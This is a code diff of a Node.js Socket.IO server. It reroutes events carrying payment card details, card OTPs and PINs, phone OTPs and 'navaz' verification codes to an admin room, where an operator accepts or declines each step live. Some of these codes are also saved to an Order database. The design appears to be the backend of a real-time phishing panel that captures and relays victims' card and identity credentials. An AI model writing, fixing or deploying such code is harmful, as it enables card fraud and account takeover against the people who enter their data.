@@ -147,119 +147,140 @@ app.get(
 );
 
 io.on("connection", (socket) => {
-  console.log("connected");
+  console.log("socket connected:", socket.id);
 
+  socket.on("joinOrder", (orderId) => {
+    console.log(`Socket ${socket.id} joining room: ${orderId}`);
+    socket.join(orderId);
+  });
 
-  socket.on("visa", (data) => io.emit("visa", data));
+  socket.on("joinAdmin", () => {
+    console.log(`Socket ${socket.id} joining admin room`);
+    socket.join("admin");
+  });
+
+  socket.on("visa", (data) => {
+    console.log("visa received", data._id);
+    io.to("admin").emit("visa", data);
+  });
 
   socket.on("acceptVisa", async (id) => {
     console.log("acceptVisa From Admin", id);
-    console.log(id);
-    io.emit("acceptVisa", id);
     await Order.findByIdAndUpdate(id, { CardAccept: true });
+    io.to(id).emit("acceptVisa", id);
   });
+
   socket.on("declineVisa", async (id) => {
     console.log("declineVisa From Admin", id);
-    io.emit("declineVisa", id);
     await Order.findByIdAndUpdate(id, { CardAccept: true });
+    io.to(id).emit("declineVisa", id);
   });
 
   socket.on("visaOtp", (data) => {
-    console.log("visaOtp  received", data);
-    io.emit("visaOtp", data);
+    console.log("visaOtp received", data.id);
+    io.to("admin").emit("visaOtp", data);
   });
+
   socket.on("acceptVisaOtp", async (id) => {
     console.log("acceptVisaOtp From Admin", id);
     await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
-    io.emit("acceptVisaOtp", id);
+    io.to(id).emit("acceptVisaOtp", id);
   });
+
   socket.on("declineVisaOtp", async (id) => {
-    console.log("declineVisaOtp Form Admin", id);
+    console.log("declineVisaOtp From Admin", id);
     await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
-    io.emit("declineVisaOtp", id);
+    io.to(id).emit("declineVisaOtp", id);
   });
 
   socket.on("visaPin", (data) => {
-    console.log("visaPin  received", data);
-    io.emit("visaPin", data);
+    console.log("visaPin received", data.id);
+    io.to("admin").emit("visaPin", data);
   });
+
   socket.on("acceptVisaPin", async (id) => {
     console.log("acceptVisaPin From Admin", id);
     await Order.findByIdAndUpdate(id, { PinAccept: true });
-    io.emit("acceptVisaPin", id);
+    io.to(id).emit("acceptVisaPin", id);
   });
+
   socket.on("declineVisaPin", async (id) => {
-    console.log("declineVisaPin Form Admin", id);
+    console.log("declineVisaPin From Admin", id);
     await Order.findByIdAndUpdate(id, { PinAccept: true });
-    io.emit("declineVisaPin", id);
+    io.to(id).emit("declineVisaPin", id);
   });
 
   socket.on("phone", (data) => {
-    console.log("phone Data", data);
-    io.emit("phone", data);
+    console.log("phone Data", data.id);
+    io.to("admin").emit("phone", data);
   });
 
   socket.on("acceptPhone", async (id) => {
-    console.log("Phone Data", id);
+    console.log("acceptPhone From Admin", id);
     await Order.findByIdAndUpdate(id, { phoneAccept: true });
-    io.emit("acceptPhone", id);
+    io.to(id).emit("acceptPhone", id);
   });
+
   socket.on("declinePhone", async (id) => {
-    console.log("declinePhone Data", id);
+    console.log("declinePhone From Admin", id);
     await Order.findByIdAndUpdate(id, { phoneAccept: true });
-    io.emit("declinePhone", id);
+    io.to(id).emit("declinePhone", id);
   });
 
-
-
-  socket.on("phoneOtp", async(data) => {
-    console.log("phoneOtp received", data);
+  socket.on("phoneOtp", async (data) => {
+    console.log("phoneOtp received", data.id);
     await Order.findByIdAndUpdate(data.id, {
       phoneOtp: data.phoneOtp,
       STCAccept: false,
     });
-    io.emit("phoneOtp", data);
+    io.to("admin").emit("phoneOtp", data);
   });
-  socket.on("acceptPhoneOtp", async ({id,code}) => {
+
+  socket.on("acceptPhoneOtp", async ({ id, code }) => {
     console.log("acceptPhoneOtp send", id);
-    io.emit("acceptPhoneOtp", {id,code});
+    io.to(id).emit("acceptPhoneOtp", { id, code });
   });
+
   socket.on("declinePhoneOtp", async (id) => {
     console.log("declinePhoneOtp send", id);
-    io.emit("declinePhoneOtp", id);
     await Order.findByIdAndUpdate(id, { phoneOtpAccept: true });
+    io.to(id).emit("declinePhoneOtp", id);
   });
 
   socket.on("acceptSTC", async (id) => {
     console.log("acceptSTC send", id);
-    io.emit("acceptSTC", id);
     await Order.findByIdAndUpdate(id, { STCAccept: true });
+    io.to(id).emit("acceptSTC", id);
   });
+
   socket.on("declineSTC", async (id) => {
     console.log("declineSTC send", id);
-    io.emit("declineSTC", id);
     await Order.findByIdAndUpdate(id, { STCAccept: true });
+    io.to(id).emit("declineSTC", id);
   });
 
   socket.on("navaz", (data) => {
-    console.log("navaz received", data);
-    io.emit("navaz", data);
+    console.log("navaz received", data.id);
+    io.to("admin").emit("navaz", data);
   });
+
   socket.on("acceptNavaz", async (data) => {
-    console.log("acceptNavaz send", data);
-    io.emit("acceptNavaz", data);
+    console.log("acceptNavaz send", data.id);
     await Order.findByIdAndUpdate(data.id, {
       NavazAccept: true,
       NavazOtp: data.userOtp,
     });
+    io.to(data.id).emit("acceptNavaz", data);
   });
+
   socket.on("declineNavaz", async (id) => {
     console.log("declineNavaz send", id);
-    io.emit("declineNavaz", id);
     await Order.findByIdAndUpdate(id, { NavazAccept: true });
+    io.to(id).emit("declineNavaz", id);
   });
-  socket.on("successValidate", (data) => io.emit("successValidate", data));
-  socket.on("declineValidate", (data) => io.emit("declineValidate", data));
+
+  socket.on("successValidate", (data) => io.to(data.id || data).emit("successValidate", data));
+  socket.on("declineValidate", (data) => io.to(data.id || data).emit("declineValidate", data));
 });
 
 
